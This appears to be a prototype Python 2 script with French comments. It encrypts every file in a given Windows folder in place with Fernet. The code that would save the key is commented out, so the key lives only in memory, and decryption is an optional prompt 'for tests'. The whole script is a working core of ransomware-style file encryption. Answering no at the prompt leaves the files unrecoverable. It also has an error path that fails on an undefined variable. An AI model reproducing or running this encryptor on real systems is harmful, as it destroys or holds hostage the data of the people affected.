# coding=utf-8
#-------------------------
# Fonction de chiffrement
#-------------------------
def chiffrement(fichier, fernet_key):

    # ouverture et lecture du fichier à chiffrer en mode binaire (byte)
    with open(fichier, 'rb') as file:
        data = file.read()  # Read the bytes of the input file

    # chiffrement du fichier en entier avec le module fernet
    try:
        encrypted = fernet_key.encrypt(data)
        print("Valid Key -", fichier, "- Successfully encrypted")
    except:
        print("Invalid Key -", fichier, "- Unsuccessfully encrypted")

    # ecriture dans le fichier lui même de son contenu chiffré
    with open(fichier, 'wb') as file:
        file.write(encrypted)  # Write the encrypted bytes to the output file

#---------------------------
# Fonction de déchiffrement
#---------------------------
def Dechiffrement(fichier, fernet_key) :

  # récupération de la clé de chiffrement
  #  fichier_key = open('key.key', 'rb')
  #  key = fichier_key.read()
  #  fernet_key = Fernet(key)
  #  fichier_key.close()

    # ouverture et lecture du fichier à déchiffrer en mode binaire (byte)
    with open(fichier, 'rb') as file:
        data = file.read()  # Read the bytes of the input file

    # déchiffrement du fichier en entier avec le module fernet
    try:
        decrypted = fernet_key.decrypt(data)
        print("Valid Key - Successfully decrypted")
    except:
        print("Invalid Key - Unsuccessfully decrypted")

    # ecriture dans le fichier lui même de son contenu déchiffré
    with open(fichier, 'wb') as file:
        file.write(decrypted)  # Write the encrypted bytes to the output file


#-----------------------------------------------------------------------------------------------------------
# Boucle principale
#-----------------------------------------------------------------------------------------------------------

# liste des fichiers (adresse complète) dans un répertoire
import glob
liste_fichier = glob.glob('c:\Users\Admin\Desktop\Test P1\*')
print(liste_fichier)

# génération d'une clé de chiffrement avec le module fernet
from cryptography.fernet import Fernet
key = Fernet.generate_key()
fernet_key = Fernet(key)
# enregistrement de la clé dans un fichier_key
#fichier_key = open('key.key', 'wb')  # Open the file as wb to write bytes
#fichier_key.write(key)  # The key is type bytes still
#fichier_key.close()

# variables
i = 0
fichier = ' '
rang = 0

while i == 0:

    try:
        fichier = liste_fichier[rang]
    except IndexError:
        i = 1
    else:
        chiffrement(fichier, fernet_key)
        rang += 1

#-----------------------------
# Pour les tests je décrypte
#-----------------------------

j = 0
reponse = " "

while j == 0:
    reponse = raw_input('Voulez-vous déchiffrer le répertoire ? : ')
    if reponse in ["Y", "y"]:
        k = 0
        rang = 0
        while k == 0:
            try:
                fichier = liste_fichier[rang]
            except IndexError:
                k = 1
                j = 1
            else:
                Dechiffrement(fichier, fernet_key)
                rang += 1
    elif reponse in ["N", "n"]:
        j = 1
        break
    else:
        print("Y ou N")
        pass




# liste des fichiers contenus dans un répertoire
#import os
#liste_fichier = os.listdir('c:\Users\Admin\Desktop\Test P1')
#print(liste_fichier)


# est-ce un fichier? taille d’un fichier? supprimer un fichier?
#os.path.isfile(path)
#os.path.getsize(path)
#os.remove(path)

